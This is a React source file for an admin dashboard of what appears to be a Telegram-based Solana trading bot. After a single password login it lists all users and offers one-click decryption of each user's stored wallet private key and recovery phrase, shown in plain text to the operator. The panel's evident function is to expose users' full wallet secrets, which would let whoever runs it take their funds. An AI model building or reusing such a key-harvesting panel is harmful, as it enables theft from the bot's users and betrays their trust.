import React, { useState, useEffect } from "react";
import { 
  Users, 
  Shield, 
  Search, 
  Lock, 
  Unlock, 
  RefreshCw, 
  Database,
  BarChart3,
  Wallet
} from "lucide-react";
import { motion, AnimatePresence } from "motion/react";

interface User {
  id: number;
  telegram_id: number;
  username: string;
  wallet_address: string;
  private_key: string;
  recovery_phrase: string;
  created_at: string;
}

interface Stats {
  users: number;
  trades: number;
}

export default function App() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [password, setPassword] = useState("");
  const [users, setUsers] = useState<User[]>([]);
  const [stats, setStats] = useState<Stats>({ users: 0, trades: 0 });
  const [search, setSearch] = useState("");
  const [decryptedValues, setDecryptedValues] = useState<Record<string, string>>({});
  const [loading, setLoading] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    const res = await fetch("/api/admin/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ password }),
    });
    if (res.ok) {
      setIsLoggedIn(true);
      fetchData();
    } else {
      alert("Invalid password");
    }
  };

  const fetchData = async () => {
    setLoading(true);
    try {
      const [usersRes, statsRes] = await Promise.all([
        fetch("/api/admin/users"),
        fetch("/api/admin/stats")
      ]);
      const usersData = await usersRes.json();
      const statsData = await statsRes.json();
      setUsers(usersData);
      setStats(statsData);
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const handleDecrypt = async (id: number, field: 'private_key' | 'recovery_phrase', encryptedText: string) => {
    const key = `${id}-${field}`;
    if (decryptedValues[key]) {
      const newValues = { ...decryptedValues };
      delete newValues[key];
      setDecryptedValues(newValues);
      return;
    }

    const res = await fetch("/api/admin/decrypt", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ encryptedText, password }),
    });
    if (res.ok) {
      const { decrypted } = await res.json();
      setDecryptedValues(prev => ({ ...prev, [key]: decrypted }));
    } else {
      alert("Decryption failed");
    }
  };

  const filteredUsers = users.filter(u => 
    u.username.toLowerCase().includes(search.toLowerCase()) || 
    u.wallet_address.toLowerCase().includes(search.toLowerCase()) ||
    u.telegram_id.toString().includes(search)
  );

  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center p-4 font-sans text-white">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="w-full max-w-md bg-[#151515] border border-white/10 rounded-2xl p-8 shadow-2xl"
        >
          <div className="flex justify-center mb-6">
            <div className="w-16 h-16 bg-emerald-500/10 rounded-2xl flex items-center justify-center border border-emerald-500/20">
              <Shield className="w-8 h-8 text-emerald-500" />
            </div>
          </div>
          <h1 className="text-2xl font-bold text-center mb-2">Admin Dashboard</h1>
          <p className="text-zinc-500 text-center mb-8 text-sm">Enter password to access encrypted user data</p>
          
          <form onSubmit={handleLogin} className="space-y-4">
            <div className="relative">
              <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-zinc-500" />
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Admin Password"
                className="w-full bg-[#1a1a1a] border border-white/10 rounded-xl py-3 pl-11 pr-4 focus:outline-none focus:border-emerald-500/50 transition-colors"
              />
            </div>
            <button
              type="submit"
              className="w-full bg-emerald-500 hover:bg-emerald-600 text-black font-bold py-3 rounded-xl transition-colors flex items-center justify-center gap-2"
            >
              <Unlock className="w-5 h-5" />
              Unlock Dashboard
            </button>
          </form>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-zinc-300 font-sans p-4 md:p-8">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <header className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-8">
          <div>
            <h1 className="text-3xl font-bold text-white flex items-center gap-3">
              <Database className="text-emerald-500" />
              Solana Bot Admin
            </h1>
            <p className="text-zinc-500 text-sm mt-1">Real-time monitoring and wallet management</p>
          </div>
          
          <div className="flex items-center gap-3">
            <button 
              onClick={fetchData}
              className="p-2 bg-[#151515] border border-white/10 rounded-lg hover:bg-[#1a1a1a] transition-colors"
            >
              <RefreshCw className={`w-5 h-5 ${loading ? 'animate-spin' : ''}`} />
            </button>
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-500" />
              <input
                type="text"
                placeholder="Search users..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="bg-[#151515] border border-white/10 rounded-lg py-2 pl-10 pr-4 focus:outline-none focus:border-emerald-500/50 w-full md:w-64"
              />
            </div>
          </div>
        </header>

        {/* Stats Grid */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
          <div className="bg-[#151515] border border-white/10 p-6 rounded-2xl">
            <div className="flex items-center gap-4">
              <div className="w-12 h-12 bg-blue-500/10 rounded-xl flex items-center justify-center border border-blue-500/20">
                <Users className="w-6 h-6 text-blue-500" />
              </div>
              <div>
                <p className="text-zinc-500 text-xs uppercase tracking-wider font-bold">Total Users</p>
                <p className="text-2xl font-bold text-white">{stats.users}</p>
              </div>
            </div>
          </div>
          <div className="bg-[#151515] border border-white/10 p-6 rounded-2xl">
            <div className="flex items-center gap-4">
              <div className="w-12 h-12 bg-emerald-500/10 rounded-xl flex items-center justify-center border border-emerald-500/20">
                <BarChart3 className="w-6 h-6 text-emerald-500" />
              </div>
              <div>
                <p className="text-zinc-500 text-xs uppercase tracking-wider font-bold">Total Trades</p>
                <p className="text-2xl font-bold text-white">{stats.trades}</p>
              </div>
            </div>
          </div>
          <div className="bg-[#151515] border border-white/10 p-6 rounded-2xl">
            <div className="flex items-center gap-4">
              <div className="w-12 h-12 bg-purple-500/10 rounded-xl flex items-center justify-center border border-purple-500/20">
                <Wallet className="w-6 h-6 text-purple-500" />
              </div>
              <div>
                <p className="text-zinc-500 text-xs uppercase tracking-wider font-bold">Network</p>
                <p className="text-2xl font-bold text-white">Solana Mainnet</p>
              </div>
            </div>
          </div>
        </div>

        {/* Users Table */}
        <div className="bg-[#151515] border border-white/10 rounded-2xl overflow-hidden shadow-xl">
          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="bg-[#1a1a1a] border-bottom border-white/5">
                  <th className="p-4 text-xs font-bold uppercase text-zinc-500">User</th>
                  <th className="p-4 text-xs font-bold uppercase text-zinc-500">Wallet Address</th>
                  <th className="p-4 text-xs font-bold uppercase text-zinc-500">Private Key</th>
                  <th className="p-4 text-xs font-bold uppercase text-zinc-500">Recovery Phrase</th>
                  <th className="p-4 text-xs font-bold uppercase text-zinc-500">Joined</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-white/5">
                <AnimatePresence>
                  {filteredUsers.map((user) => (
                    <motion.tr 
                      key={user.id}
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      className="hover:bg-white/[0.02] transition-colors"
                    >
                      <td className="p-4">
                        <div className="flex flex-col">
                          <span className="text-white font-medium">@{user.username}</span>
                          <span className="text-xs text-zinc-500">ID: {user.telegram_id}</span>
                        </div>
                      </td>
                      <td className="p-4">
                        <code className="text-xs bg-black/30 px-2 py-1 rounded text-emerald-400">
                          {user.wallet_address.slice(0, 8)}...{user.wallet_address.slice(-8)}
                        </code>
                      </td>
                      <td className="p-4">
                        <button 
                          onClick={() => handleDecrypt(user.id, 'private_key', user.private_key)}
                          className="flex items-center gap-2 text-xs bg-[#1a1a1a] hover:bg-[#222] px-3 py-1.5 rounded-lg border border-white/5 transition-colors"
                        >
                          {decryptedValues[`${user.id}-private_key`] ? <Unlock className="w-3 h-3 text-emerald-500" /> : <Lock className="w-3 h-3" />}
                          <span className="font-mono">
                            {decryptedValues[`${user.id}-private_key`] || "••••••••••••••••"}
                          </span>
                        </button>
                      </td>
                      <td className="p-4">
                        <button 
                          onClick={() => handleDecrypt(user.id, 'recovery_phrase', user.recovery_phrase)}
                          className="flex items-center gap-2 text-xs bg-[#1a1a1a] hover:bg-[#222] px-3 py-1.5 rounded-lg border border-white/5 transition-colors"
                        >
                          {decryptedValues[`${user.id}-recovery_phrase`] ? <Unlock className="w-3 h-3 text-emerald-500" /> : <Lock className="w-3 h-3" />}
                          <span className="font-mono">
                            {decryptedValues[`${user.id}-recovery_phrase`] || "••••••••••••••••"}
                          </span>
                        </button>
                      </td>
                      <td className="p-4 text-xs text-zinc-500">
                        {new Date(user.created_at).toLocaleDateString()}
                      </td>
                    </motion.tr>
                  ))}
                </AnimatePresence>
              </tbody>
            </table>
          </div>
          {filteredUsers.length === 0 && (
            <div className="p-12 text-center">
              <Users className="w-12 h-12 text-zinc-700 mx-auto mb-4" />
              <p className="text-zinc-500">No users found</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
